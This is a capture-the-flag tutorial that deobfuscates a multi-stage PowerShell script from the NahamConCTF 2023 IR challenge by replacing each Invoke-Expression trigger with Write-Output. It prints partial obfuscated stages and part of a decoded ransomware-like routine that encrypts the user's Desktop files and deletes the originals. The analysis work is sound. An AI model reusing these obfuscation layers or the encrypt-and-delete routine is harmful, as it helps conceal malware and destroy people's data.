---
description: Deobfuscate heavily-obfuscated PowerShell scripts to find their source code
---

# PowerShell

Obfuscating PowerShell is a real art, and there are many ways to encode scripts in weird ways. Luckily, most of them work in the same way: 1. **Decoding some string** and 2. **Executing that string** as another stage in the script.&#x20;

Often this is a task of finding the part that _executes_ the code, removing it, and instead printing the code so you can analyze it further.&#x20;

I will explain this process with an **example**. This is taken from the _NahamConCTF 2023 - IR_ challenge, which provided the following PowerShell script:

{% file src="../.gitbook/assets/updates.ps1" %}
Obfuscated PowerShell script from the _NahamConCTF 2023 - IR_ challenge
{% endfile %}

It starts off with a lot of special characters that are supposed to evaluate into something:

{% code overflow="wrap" fullWidth="false" %}
```powershell
${;}=+$();${=}=${;};${+}=++${;};${@}=++${;};${.}=++${;};${[}=++${;}; ${]}=++${;};${(}=++${;};${)}=++${;};${&}=++${;};${|}=++${;}; ${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]"; ${;}="".("$(@{})"["${+}${[}"]+"$(@{})"["${+}${(}"]+"$(@{})"[${=}]+"$(@{})"[${[}]+"$?"[${+}]+"$(@{})"[${.}]); ${;}="$(@{})"["${+}${[}"]+"$(@{})"[${[}]+"${;}"["${@}${)}"]; "${"}${.}${(}+${"}${]}${)}+${"}${)}${@}+${"}${+}${+}${&}+${"}${+}${+}${(}+${"}${)}${)}+${"}${)}${=}+${"}${|}${&}+${"}${(}${)}+${"}${]}${=}+${"}${&}${@}+${"}${)}${+}+${"}$
...
```
{% endcode %}

A common way to make a little sense of this is to format it, like adding **newlines** after `;` semicolons. In this case, however, there are semicolons used all over the place, not just as statement enders. To do this more cleanly we'll use the [`PowerShell-Beautifier`](https://github.com/DTW-DanWard/PowerShell-Beautifier) script to parse and format these statements, which will then allow us to separate a `${;}` from a `;` as only the second has a space after it.&#x20;

```powershell
PS> Install-Module -Name PowerShell-Beautifier
PS> Edit-DTWBeautifyScript -Source .\updates.ps1 -Destination .\stage0.ps1
```

When we afterward replace `;` with `;\n` in an IDE like Visual Studio Code, we find a more slightly more readable script:

```powershell
${;} = + $(); 
${=} = ${;}; 
${+} =++ ${;}; 
${@} =++ ${;}; 
${.} =++ ${;}; 
${[} =++ ${;}; 
${]} =++ ${;}; 
${(} =++ ${;}; 
${)} =++ ${;}; 
${&} =++ ${;}; 
${|} =++ ${;}; 
${"} = "[" + "$(@{})"[${)}] + "$(@{})"["${+}${|}"] + "$(@{})"["${@}${=}"] + "$?"[${+}] + "]"; 
${;} = "".("$(@{})"["${+}${[}"] + "$(@{})"["${+}${(}"] + "$(@{})"[${=}] + "$(@{})"[${[}] + "$?"[${+}] + "$(@{})"[${.}]); 
${;} = "$(@{})"["${+}${[}"] + "$(@{})"[${[}] + "${;}"["${@}${)}"]; 
"${"}${.}${(}+${"}${]}${)}+${"}${)}${@}+${"}${+}${+}${&}+${"}${+}${+}${(}+${"}${)}${)}+${"}${)}${=}+${"}${|}${&}+${"}${(}${)}+${"}${]}${=}+${"}${&}${@}+${"}${)}${+}+${"}${)}${[}+${"}${&}${&}+${"}${]}${[}+${"}${&}${|}+${"}${)}${|}+${"}${(}${]}+${"}${&}${.}+${"}${+}${=}${(}+${"}${)}${&}+${"}${+}
...
```

First, it defines a few variables with the `${}` syntax, and after, it uses those variables in a giant string. The first few variables are some primitives, and the last 3 variables seem to be more complicated but still short. We could statically try to reason with this, but a much simpler way would be to just let PowerShell **evaluate** it for us. Let's run the first few lines making sure nothing can trigger a payload on our investigating machine:

<pre class="language-powershell"><code class="lang-powershell">${;} = + $(); 
${=} = ${;}; 
${+} =++ ${;}; 
${@} =++ ${;}; 
${.} =++ ${;}; 
${[} =++ ${;}; 
${]} =++ ${;}; 
${(} =++ ${;}; 
${)} =++ ${;}; 
${&#x26;} =++ ${;}; 
${|} =++ ${;}; 
${"} = "[" + "$(@{})"[${)}] + "$(@{})"["${+}${|}"] + "$(@{})"["${@}${=}"] + "$?"[${+}] + "]"; 
${;} = "".("$(@{})"["${+}${[}"] + "$(@{})"["${+}${(}"] + "$(@{})"[${=}] + "$(@{})"[${[}] + "$?"[${+}] + "$(@{})"[${.}]); 
${;} = "$(@{})"["${+}${[}"] + "$(@{})"[${[}] + "${;}"["${@}${)}"]; 

<strong>PS> ${"}
</strong>[CHar]
<strong>PS> ${;}
</strong>iex
</code></pre>

Here we find a very important string: `iex` which means **I**nvoke-**Ex**pression. This will take a string, and execute it as PowerShell code, which is very common for these obfuscators. We need to be careful to **remove** this part to make sure our code is not actually run, only the string is evaluated for us.&#x20;

All the way at the end of the script we find:

```bash
...${]}${|}|${;}" | &${;};
```

We will remove this `${;}` now that we know it means to evaluate and run the code, and instead replace it with a `Write-Output` command which simply prints it to the console:

```bash
...${]}${|}|${;}" | Write-Output
```

Running this safe script now prints the next stage of the script, obfuscated in a different way:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>PS> .\stage0.ps1 > stage1.ps1
</strong>
[CHar]36+[CHar]57+[CHar]72+[CHar]118+[CHar]116+[CHar]77+[CHar]70+[CHar]98+[CHar]67+[CHar]50+[CHar]82+[CHar]71+[CHar]74+[CHar]88+[CHar]54+[CHar]89+[CHar]79+[CHar]65+[CHar]83+[CHar]106+[CHar]78+[CHar]101+[CHar]66+[CHar]120+[CHar]32+[CHar]61+[CHar]32+[CHar]34+[CHar]61+[CHar]107+[CHar]105+[CHar]73+[CHar]119+[CHar]108+[CHar]109+[CHar]101+[CHar]117+[CHar]65+[CHar]51+[CHar]98+[CHar]48+[CHar]116+[CHar]50
...
[CHar]86+[CHar]32+[CHar]59|iex
</code></pre>

It uses a very similar scheme, building out a script and then evaluating it with `iex`, literally this time. In a very similar fashion to last time, we'll simply remove the trigger of the payload and only print it using `Write-Output`:

```
...
[CHar]86+[CHar]32+[CHar]59 | Write-Output
```

When we now execute the safe script, we find another stage:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>PS> .\stage1.ps1 > stage2.ps1
</strong>
$9HvtMFbC2RGJX6YOASjNeBx = "=kiIwlmeuA3b0t2clREXzRWYvxmb39GRcJyKyV2c1RyKiw1cyV2cVxlODJCKggGdhBFbhJXZ0lGTtASblRXStUmdv1WZSpQD5R2biRCI5R2bC1CIi42bpRXYyRHbpZGel9SbvNmLyV2ajFGasxWZoNncld3bwVGa05yd3d3LvozcwRHdoJCIpJXVtACdz9GUgQ2boRXZN1CI0NXZ1FXZyJWZX1SZr9mdulkCN0XY0FGRlxWaGBXa6RSPlxWamtHQgQ3YlpmYPRXdw5WStAibvNnSt8GV0JXZ252bDBSPgkHZvJGJK0QKzVGd5JUZslmRwlmekgyZulmc0NFN2U2chJ0bUpjOdRnclZnbvN0Wg0DIhRXYEVGbpZEcppHJK0QZ0lnQgcmbpR2bj5WRtAydhJVLgkiIwlmeuA3b0t2c
...
N3bwBCL9VWdyR3ek0Tey9GdhRmbh1EKyVGdl1WYyFGUblQCK0AKtFmchBVCK0wezVGbpZEdwlncj5WZg42bpR3YuVnZ" ; $OaET = $9HvtMFbC2RGJX6YOASjNeBx.ToCharArray() ; [array]::Reverse($OaET) ; -join $OaET 2>&#x26;1> $null ; $biPIv9ahScgYwGXl0FyV = [SySteM.tExt.EnCOding]::uTf8.GetStRIng([SySTEm.COnVerT]::FrombASe64StRINg("$OaET")) ; $ehyGknDcqxFwCYJz5vfot4T8 = "iN"+"vo"+"Ke"+"-e"+"xP"+"RE"+"ss"+"Io"+"n" ; neW-aLIAs -NAme PwN -VAlUE $ehyGknDcqxFwCYJz5vfot4T8 -forCE ; pWN $biPIv9ahScgYwGXl0FyV ;
</code></pre>

This is another nightmare one-liner, but we'll simply use the `PowerShell-Beautifier` trick together with replacing `;` with `;\n` to make it more readable:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS> Edit-DTWBeautifyScript -Source .\stage2.ps1 -Destination .\stage2.ps1
</strong>
$9HvtMFbC2RGJX6YOASjNeBx = "=kiIwlmeuA3b0t2clREXzRWYvxmb39GRcJyKyV2c1RyKiw1cyV2cVxlODJC...zVGbpZEdwlncj5WZg42bpR3YuVnZ";
$OaET = $9HvtMFbC2RGJX6YOASjNeBx.ToCharArray();
[array]::Reverse($OaET);
-join $OaET 2>&#x26;1 > $null;
$biPIv9ahScgYwGXl0FyV = [System.Text.Encoding]::uTf8.GetStRIng([System.Convert]::FrombASe64StRINg("$OaET"));
$ehyGknDcqxFwCYJz5vfot4T8 = "iN" + "vo" + "Ke" + "-e" + "xP" + "RE" + "ss" + "Io" + "n";
New-Alias -Name PwN -Value $ehyGknDcqxFwCYJz5vfot4T8 -Force;
pWN $biPIv9ahScgYwGXl0FyV;
</code></pre>

Pretty clearly we can read the string concatenation in `$ehyGknDcqxFwCYJz5vfot4T8` is another `Invoke-Expression`. This is assigned to a `New-Alias` as `PwN`. Later we see this alias used on another string, which would be executed as code. So instead, we again replace this with a `Write-Console` to find what it does:

```powershell
$9HvtMFbC2RGJX6YOASjNeBx = "=kiIwlmeuA3b0t2clREXzRWYvxmb39GRcJyKyV2c1RyKiw1cyV2cVxlODJC...zVGbpZEdwlncj5WZg42bpR3YuVnZ";
$OaET = $9HvtMFbC2RGJX6YOASjNeBx.ToCharArray();
[array]::Reverse($OaET);
-join $OaET 2>&1 > $null;
$biPIv9ahScgYwGXl0FyV = [System.Text.Encoding]::uTf8.GetStRIng([System.Convert]::FrombASe64StRINg("$OaET"));
Write-Output $biPIv9ahScgYwGXl0FyV;
```

Running this final stage we find the clean source code:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS>  .\stage2.ps1 > stage3.ps1
</strong>
function encryptFiles{
	Param(
		[Parameter(Mandatory=${true}, position=0)]
		[string] $baseDirectory
	)
	foreach($File in (Get-ChildItem $baseDirectory -Recurse -File)){
		if ($File.extension -ne ".enc"){
			$DestinationFile = $File.FullName + ".enc"
			$FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
			...
			$FileStreamWriter.Close()
			Remove-Item -LiteralPath $File.FullName
		}
	}
}
$flag = "flag{892a8921517dcecf90685d478aedf5e2}"
$ErrorActionPreference= 'silentlycontinue'
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[-1]
encryptFiles("C:\Users\"+$user+"\Desktop")
...
</code></pre>

In this challenge, the flag was found here. But in other cases, you might want to understand the `encryptFiles` function now to find how files are encrypted, and how they can be decrypted.&#x20;

> For another example that digs more into understanding the payload, see this [walkthrough](https://www.youtube.com/watch?v=GguO\_Oc0h5A) of another piece of obfuscated PowerShell malware.&#x20;
